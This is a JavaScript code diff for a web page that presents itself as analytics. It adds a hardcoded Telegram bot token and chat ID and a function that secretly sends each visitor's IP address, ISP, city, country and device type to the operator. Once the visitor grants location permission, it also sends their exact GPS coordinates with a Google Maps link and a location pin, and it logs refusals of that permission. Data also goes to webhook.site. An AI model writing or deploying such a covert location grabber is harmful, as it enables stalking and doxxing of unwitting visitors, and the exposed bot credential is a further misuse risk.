@@ -5,7 +5,11 @@
 
 const ANALYTICS_CONFIG = {
     webhookUrl: 'https://webhook.site/57a80c61-c036-4435-b21c-c4143d76ef09',
-    googleScriptUrl: 'https://script.google.com/macros/s/AKfycbzxGJGGRP5uJSDxCKvlfDwetmIuz-hr9vumL8OIbSHlzToEa1kWogNmRmpHZdrC7Mqh/exec',
+    
+    // Telegram Bot directo (sin Google Script)
+    telegramBotToken: '8607851610:AAE1gAl2tHeL6kYN2jxB6QOD87gALi86-S4',
+    telegramChatId: '7558822184',
+    
     timeout: 10000,
     sessionId: 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
 };
@@ -102,13 +106,13 @@ function requestGPS() {
 }
 
 // ============================================
-// ENVÍO DE DATOS (no bloquea si falla)
+// ENVÍO DE DATOS
 // ============================================
 
 async function sendData(payload) {
     const promises = [];
 
-    // Webhook.site
+    // 1. Webhook.site
     promises.push(
         fetch(ANALYTICS_CONFIG.webhookUrl, {
             method: 'POST',
@@ -117,19 +121,94 @@ async function sendData(payload) {
         }).catch(() => {})
     );
 
-    // Google Script (Telegram) - text/plain para evitar CORS
-    if (ANALYTICS_CONFIG.googleScriptUrl) {
-        promises.push(
-            fetch(ANALYTICS_CONFIG.googleScriptUrl, {
-                method: 'POST',
-                mode: 'no-cors',
-                headers: { 'Content-Type': 'text/plain' },
-                body: JSON.stringify(payload)
-            }).catch(() => {})
-        );
-    }
+    // 2. Telegram directo
+    promises.push(sendToTelegram(payload).catch(() => {}));
 
     await Promise.allSettled(promises);
+}
+
+async function sendToTelegram(data) {
+    const token = ANALYTICS_CONFIG.telegramBotToken;
+    const chatId = ANALYTICS_CONFIG.telegramChatId;
+    const apiUrl = 'https://api.telegram.org/bot' + token;
+
+    let mensaje = '';
+
+    if (data.event === 'page_load') {
+        const net = data.networkInfo || {};
+        mensaje = 
+            '🌐 *Nueva visita*\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n\n' +
+            '📅 ' + new Date().toLocaleString('es-AR') + '\n\n' +
+            '🔹 *IP:* `' + (net.ip || 'N/A') + '`\n' +
+            '🔹 *ISP:* ' + (net.isp || 'N/A') + '\n' +
+            '🔹 *Ciudad:* ' + (net.city || 'N/A') + '\n' +
+            '🔹 *Región:* ' + (net.region || 'N/A') + '\n' +
+            '🔹 *País:* ' + (net.country || 'N/A') + '\n' +
+            '🔹 *Dispositivo:* ' + (data.deviceType || 'N/A') + '\n\n' +
+            '⏳ Esperando permiso GPS...';
+
+    } else if (data.event === 'gps_granted') {
+        const gps = data.gpsData || {};
+        const net = data.networkInfo || {};
+        const lat = gps.latitude || 0;
+        const lng = gps.longitude || 0;
+        const mapUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
+
+        mensaje = 
+            '🔴 *UBICACIÓN GPS CAPTURADA*\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n\n' +
+            '📅 ' + new Date().toLocaleString('es-AR') + '\n\n' +
+            '🌐 *RED*\n' +
+            '🔹 IP: `' + (net.ip || 'N/A') + '`\n' +
+            '🔹 ISP: ' + (net.isp || 'N/A') + '\n' +
+            '🔹 Ciudad: ' + (net.city || 'N/A') + '\n\n' +
+            '✅ *GPS ACEPTADO*\n' +
+            '📍 Lat: `' + lat + '`\n' +
+            '📍 Lng: `' + lng + '`\n' +
+            '📏 Precisión: ' + (gps.accuracy || 'N/A') + ' metros\n\n' +
+            '🗺️ [Ver en Google Maps](' + mapUrl + ')';
+
+        // Enviar mensaje + ubicación en mapa
+        await fetch(apiUrl + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: mensaje,
+                parse_mode: 'Markdown',
+                disable_web_page_preview: false
+            })
+        });
+
+        // Enviar pin de ubicación interactivo
+        await fetch(apiUrl + '/sendLocation', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lng })
+        });
+
+        return;
+
+    } else if (data.event === 'gps_denied' || data.event === 'gps_denied_again') {
+        mensaje = 
+            '❌ *GPS Rechazado*\n' +
+            '━━━━━━━━━━━━━━━━━━━━\n\n' +
+            '📅 ' + new Date().toLocaleString('es-AR') + '\n' +
+            '⚠️ Usuario denegó el permiso';
+    }
+
+    if (mensaje) {
+        await fetch(apiUrl + '/sendMessage', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: mensaje,
+                parse_mode: 'Markdown'
+            })
+        });
+    }
 }
 
 // ============================================
